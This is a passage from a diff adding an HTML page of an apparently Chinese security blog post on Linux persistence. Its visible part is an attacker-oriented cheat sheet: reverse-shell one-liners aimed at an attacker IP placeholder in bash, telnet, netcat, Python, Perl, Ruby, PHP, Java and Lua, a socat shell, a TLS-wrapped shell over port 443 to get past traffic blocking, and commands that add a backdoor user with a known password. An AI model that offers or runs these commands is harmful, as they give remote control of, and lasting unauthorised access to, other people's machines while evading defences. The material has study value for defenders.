@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Linux下的权限维持 - V4ler1an-有毒</title><meta name="Description" content="简单总结下Linux平台下的反弹shell方法和权限维持方法"><meta property="og:title" content="Linux下的权限维持" />
+<meta property="og:description" content="简单总结下Linux平台下的反弹shell方法和权限维持方法" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2020/12/Backdoor/" /><meta property="og:image" content="https://www.v4ler1an.com/logo.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-12-13T23:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2020-12-13T23:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://www.v4ler1an.com/logo.jpg"/>
+
+<meta name="twitter:title" content="Linux下的权限维持"/>
+<meta name="twitter:description" content="简单总结下Linux平台下的反弹shell方法和权限维持方法"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2020/12/Backdoor/" /><link rel="prev" href="https://www.v4ler1an.com/2020/11/JWT/" /><link rel="next" href="https://www.v4ler1an.com/2020/12/MBR/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux下的权限维持",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2020\/12\/Backdoor\/"
+        },"image": ["https:\/\/www.v4ler1an.com\/images\/cyber1-4.jpg"],"genre": "posts","keywords": "Security","wordcount":  5374 ,
+        "url": "https:\/\/www.v4ler1an.com\/2020\/12\/Backdoor\/","datePublished": "2020-12-13T23:00:00+00:00","dateModified": "2020-12-13T23:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "V4ler1an"
+            },"description": "简单总结下Linux平台下的反弹shell方法和权限维持方法"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an-有毒"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/cyber5.jpeg"
+        data-srcset="/images/cyber5.jpeg, /images/cyber5.jpeg 1.5x, /images/cyber5.jpeg 2x"
+        data-sizes="auto"
+        alt="/images/cyber5.jpeg"
+        title="/images/cyber5.jpeg" /><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/categories/documentation/"> 文档 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/AlexsanderShaw" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2020/12/Backdoor/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an-有毒"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/cyber5.jpeg"
+        data-srcset="/images/cyber5.jpeg, /images/cyber5.jpeg 1.5x, /images/cyber5.jpeg 2x"
+        data-sizes="auto"
+        alt="/images/cyber5.jpeg"
+        title="/images/cyber5.jpeg" /><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/categories/documentation/" title="">文档</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/AlexsanderShaw" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2020/12/Backdoor/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Linux下的权限维持</h1><h2 class="single-subtitle">权限维持</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>V4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/tech/"><i class="far fa-folder fa-fw"></i>Tech</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-12-13">2020-12-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5374 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 11 分钟&nbsp;<span id="/2020/12/Backdoor/" class="leancloud_visitors" data-flag-title="Linux下的权限维持">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一basic-knowledge">一、Basic Knowledge</a>
+      <ul>
+        <li><a href="#1-概念">1. 概念</a></li>
+        <li><a href="#2-前置条件----获取初始权限">2. 前置条件 &ndash; 获取初始权限</a>
+          <ul>
+            <li><a href="#1-bash反弹">1. Bash反弹</a></li>
+            <li><a href="#2-telnet反弹">2. telnet反弹</a></li>
+            <li><a href="#3-ncnetcat反弹">3. nc(netcat)反弹</a></li>
+            <li><a href="#4-常见脚本反弹">4. 常见脚本反弹</a>
+              <ul>
+                <li><a href="#1-python">1. Python</a></li>
+                <li><a href="#2-perl">2. Perl</a></li>
+                <li><a href="#3-ruby">3. Ruby</a></li>
+                <li><a href="#4-php">4. PHP</a></li>
+                <li><a href="#5-java">5. Java</a></li>
+                <li><a href="#6-lua">6. Lua</a></li>
+              </ul>
+            </li>
+            <li><a href="#3-其他方法">3. 其他方法</a>
+              <ul>
+                <li><a href="#1-socat">1. socat</a></li>
+                <li><a href="#2-只有80和443端口且反弹shell流量被拦截">2. 只有80和443端口且反弹shell流量被拦截</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#二权限维持方法">二、权限维持方法</a>
+      <ul>
+        <li><a href="#1-一句话添加用户和密码">1. 一句话添加用户和密码</a></li>
+        <li><a href="#2-增加超级用户">2. 增加超级用户</a></li>
+        <li><a href="#1-ssh后门">1. SSH后门</a>
+          <ul>
+            <li><a href="#1-sshd-软连接">1. sshd 软连接</a></li>
+            <li><a href="#2-ssh免密后门文件落地">2. ssh免密后门(文件落地)</a></li>
+            <li><a href="#3-ssh-wrapper文件落地">3. ssh wrapper（文件落地）</a></li>
+            <li><a href="#4-ssh的隐身登录">4. ssh的隐身登录</a></li>
+          </ul>
+        </li>
+        <li><a href="#3-suid-shell">3. SUID Shell</a></li>
+        <li><a href="#4-crontab后门文件落地">4. crontab后门（文件落地）</a></li>
+        <li><a href="#5-alias欺骗文件落地">5. alias欺骗（文件落地）</a></li>
+        <li><a href="#6-linux-pam密码记录后门文件落地">6. Linux PAM密码记录后门（文件落地）</a></li>
+        <li><a href="#5-prompt_command后门">5. PROMPT_COMMAND后门</a></li>
+        <li><a href="#7-rootkit">7. Rootkit</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考文献">参考文献</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="权限维持----linux">权限维持 &ndash; Linux</h1>
+<h2 id="一basic-knowledge">一、Basic Knowledge</h2>
+<h3 id="1-概念">1. 概念</h3>
+<p>可以简单理解为通过隐藏手段或在目标上安装后门以保持已获取的权限不会被打掉，一直控制目标，属于后渗透阶段的重点内容。</p>
+<h3 id="2-前置条件----获取初始权限">2. 前置条件 &ndash; 获取初始权限</h3>
+<p>获取初始权限。最常见也是个人最喜欢的是反弹shell回来，方便后续操作。这里简单总结下反弹shell的常见手法：</p>
+<h4 id="1-bash反弹">1. Bash反弹</h4>
+<p>攻击机监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvvp port
+</code></pre></td></tr></table>
+</div>
+</div><p>目标执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/x.x.x.x/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>或者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;<span class="p">&amp;</span><span class="m">5</span> 1&gt;<span class="p">&amp;</span><span class="m">5</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>bash -i</code>：打开一个交互的bash</li>
+<li><code>&gt;&amp; /dev/tcp/x.x.x.x/port</code>：调用socket建立链接，x.x.x.x为要接收shell的主机ip，port为端口，将标准错误和标准输出重定向到socket连接文件。</li>
+<li><code>0&gt;&amp;1</code>：标准输入重定向到标准输出，此时标准输出指向socket连接，从而实现了与反弹shell的交互。</li>
+</ul>
+<p>第二种则是将标准输入、输出和错误均重定向到socket连接文件。</p>
+<p><strong>备注：Linux不同发行版之间存在差异，某些命令可能并不适用，可自行调整。</strong></p>
+<h4 id="2-telnet反弹">2. telnet反弹</h4>
+<p>第一种：</p>
+<p>攻击机开2个终端，分别执行监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lv port1
+</code></pre></td></tr></table>
+</div>
+</div><p>和</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nv -lv port2
+</code></pre></td></tr></table>
+</div>
+</div><p>目标主机执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">telent x.x.x.x port1 <span class="p">|</span> /bin/bash <span class="p">|</span> telnet x.x.x.x port2
+</code></pre></td></tr></table>
+</div>
+</div><p>监听2个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip。</p>
+<p>第二种：</p>
+<p>攻击机监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lv port
+</code></pre></td></tr></table>
+</div>
+</div><p>目标主机执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">rm -f /tmp/a<span class="p">;</span>mknod /tmp/a p<span class="p">;</span>telnet x.x.x.x port 0&lt;/tmp/a <span class="p">|</span> /bin/bash 1&gt;tmp/a
+</code></pre></td></tr></table>
+</div>
+</div><p>其中x.x.x.x为攻击机ip。</p>
+<h4 id="3-ncnetcat反弹">3. nc(netcat)反弹</h4>
+<p>攻击机监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lv port
+</code></pre></td></tr></table>
+</div>
+</div><p>目标执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -e /bin/bash x.x.x.x port
+</code></pre></td></tr></table>
+</div>
+</div><p>如果目标上没有<code>-e</code>参数可以使用以下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">rm -f /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f <span class="p">|</span> /bin/bash -i 2&gt;<span class="nv">$1</span> <span class="p">|</span> nc x.x.x.x port &gt;/tmp/f
+</code></pre></td></tr></table>
+</div>
+</div><p><code>mkfifo</code>的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。</p>
+<p>此外，也可以使用telnet的监听2个端口的方式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc x.x.x.x port1 <span class="p">|</span> /bin/bash <span class="p">|</span> nc x.x.x.x port2
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="4-常见脚本反弹">4. 常见脚本反弹</h4>
+<p>下述脚本均需要现在攻击机上开启监听：<code>nc -lv port</code>，将脚本中ip替换为对应的攻击机IP，port替换为实际使用的端口。</p>
+<h5 id="1-python">1. Python</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;x.x.x.x&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="2-perl">2. Perl</h5>
+<ol>
+<li>
+<p>第一种：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-perl" data-lang="perl"> <span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&#34;x.x.x.x&#34;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>第二种：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-perl" data-lang="perl"> <span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;x.x.x.x:port&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h5 id="3-ruby">3. Ruby</h5>
+<ol>
+<li>
+<p>第一种：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exit if fork;c=TCPSocket.new(&#34;x.x.x.x&#34;,&#34;port&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>第二种：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&#34;x.x.x.x&#34;,port).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h5 id="4-php">4. PHP</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;x.x.x.x&#34;,port);exec(&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="5-java">5. Java</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Revs</span> <span class="o">{</span>
+    <span class="cm">/**
+</span><span class="cm">    * @param args
+</span><span class="cm">    * @throws Exception 
+</span><span class="cm">    */</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="c1">// TODO Auto-generated method stub
+</span><span class="c1"></span>        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">cmd</span><span class="o">[]=</span> <span class="o">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span><span class="s">&#34;-c&#34;</span><span class="o">,</span><span class="s">&#34;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="o">};</span>
+        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+        <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="6-lua">6. Lua</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-lua" data-lang="lua"><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;port&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="3-其他方法">3. 其他方法</h4>
+<h5 id="1-socat">1. socat</h5>
+<p>攻击机监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> tcp-listen:port
+</code></pre></td></tr></table>
+</div>
+</div><p>上传socat到目标主机，然后执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setid,sigint,sane tcp x.x.x.x:port
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="2-只有80和443端口且反弹shell流量被拦截">2. 只有80和443端口且反弹shell流量被拦截</h5>
+<p>方法论：加密流程，绕过拦截</p>
+<p>Step 1：VPS上生成SSL证书的公钥/私钥对</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes
+</code></pre></td></tr></table>
+</div>
+</div><p>Step 2：VPN监听反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">openssl s_server -quiet  -key key.pem -cert cert.pem -port <span class="m">443</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Step 3：连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">mkfifo /tmp/v4ler1an<span class="p">;</span>/bin/bash -i &lt; /tmp/v4ler1an 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span>openssl s_client -quiet -connect x.x.x.x:443 &gt; /tmp/v4ler1an
+</code></pre></td></tr></table>
+</div>
+</div><p>此时的shell存在缺陷（无法命令补全等），通过以下方法修复：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>pty</code>是一个伪终端模块。<code>pty.spawn(argv[, master_read[, stdin_read]])</code>产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数 master_read 和 stdin_read 传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。 会向 master_read 回调传入伪终端的主文件描述符以从子进程读取输出，而向 stdin_read 传入文件描述符 0 以从父进程的标准输入读取数据。
+在 3.4 版更改: spawn() 现在从子进程的 os.waitpid() 返回状态值</p>
+<h2 id="二权限维持方法">二、权限维持方法</h2>
+<h3 id="1-一句话添加用户和密码">1. 一句话添加用户和密码</h3>
+<p>添加普通用户：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 创建一个用户名guest，密码为123456的普通用户</span>
+
+useradd -p <span class="sb">`</span>openssl passwd -1 -salt <span class="s1">&#39;salt&#39;</span> 123456<span class="sb">`</span> guest
+
+<span class="c1"># useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。</span>
+useradd -p <span class="s2">&#34;</span><span class="k">$(</span>openssl passwd -1 123456<span class="k">)</span><span class="s2">&#34;</span> guest
+
+<span class="c1"># chpasswd方法</span>
+useradd guest<span class="p">;</span><span class="nb">echo</span> <span class="s1">&#39;guest:123456&#39;</span><span class="p">|</span>chpasswd
+
+<span class="c1"># echo -e方法</span>
